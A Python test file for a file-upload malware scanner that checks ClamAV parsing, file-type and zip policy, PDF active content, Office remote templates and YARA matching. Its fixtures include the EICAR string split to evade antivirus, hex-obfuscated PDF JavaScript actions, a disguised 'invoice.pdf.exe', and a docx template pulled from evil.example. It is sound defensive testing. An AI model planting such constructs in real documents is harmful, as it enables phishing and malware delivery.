import io
import zipfile

from tgviewer.scanning import archive, clamav, filetype, office, pdf, yara_engine
from tgviewer.scanning.result import EngineResult, combine

# Built from parts so no antivirus on a developer machine flags this source file.
EICAR = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-" + "ANTIVIRUS-TEST-FILE!$H+H*").encode()


def test_combine_worst_wins():
    assert combine([EngineResult("a", "clean")]) == ("clean", "")
    assert combine([EngineResult("a", "clean"), EngineResult("b", "skipped")])[0] == "clean"
    assert combine([EngineResult("a", "suspicious", "x"), EngineResult("b", "malicious", "y")]) == ("malicious", "b: y")
    assert combine([EngineResult("a", "error", "down")])[0] == "suspicious"  # fail closed
    assert combine([EngineResult("a", "blocked"), EngineResult("b", "suspicious")])[0] == "blocked"


def test_clamav_reply_parsing():
    assert clamav.parse_reply("stream: OK").verdict == "clean"
    r = clamav.parse_reply("stream: Win.Test.EICAR_HDB-1 FOUND")
    assert (r.verdict, r.detail) == ("malicious", "Win.Test.EICAR_HDB-1")
    assert clamav.parse_reply("stream: Heuristics.Encrypted.Zip FOUND").verdict == "suspicious"
    assert clamav.parse_reply("INSTREAM size limit exceeded. ERROR").verdict == "skipped"
    assert clamav.parse_reply("garbage").verdict == "error"


def test_type_policy(tmp_path):
    p = tmp_path / "f"
    p.write_bytes(b"MZ\x90\x00" + b"\x00" * 60 + b"PE\x00\x00" + b"\x00" * 200)
    assert filetype.check(p, "invoice.exe")[0].verdict == "blocked"
    assert filetype.check(p, "invoice.pdf")[0].verdict in ("blocked", "suspicious")
    p.write_bytes(b"%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF")
    assert filetype.check(p, "doc.pdf")[0].verdict == "clean"
    assert filetype.check(p, "photo.jpg")[0].verdict == "suspicious"  # extension mismatch
    assert filetype.check(p, "report.docm")[0].verdict == "suspicious"


def test_zip_member_policy(tmp_path):
    p = tmp_path / "a.zip"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("readme.txt", "hello")
        z.writestr("docs/invoice.pdf.exe", b"MZ" + b"\x00" * 100)
    results = archive.scan_zip(p)
    assert any(r.verdict == "blocked" and "invoice.pdf.exe" in r.detail for r in results)


def test_pdf_active_content(tmp_path):
    p = tmp_path / "x.pdf"
    p.write_bytes(b"%PDF-1.4 /OpenAction 2 0 R /JavaScript (app.alert(1))")
    assert pdf.scan(p).verdict == "suspicious"
    p.write_bytes(b"%PDF-1.4 /Open#41ction /J#61vaScript")  # hex-obfuscated names
    assert pdf.scan(p).verdict == "suspicious"
    p.write_bytes(b"%PDF-1.4 /Type /Catalog")
    assert pdf.scan(p).verdict == "clean"


def test_office_remote_template(tmp_path):
    p = tmp_path / "t.docx"
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/_rels/settings.xml.rels",
                   '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/'
                   'officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" '
                   'TargetMode="External"/></Relationships>')
    assert office.scan(p).verdict == "suspicious"


def test_yara_builtin(tmp_path):
    yara_engine.load()
    p = tmp_path / "e.txt"
    p.write_bytes(EICAR)
    assert yara_engine.scan(p, "e.txt").verdict == "malicious"
    p.write_bytes(b"just a normal text file")
    assert yara_engine.scan(p, "n.txt").verdict == "clean"
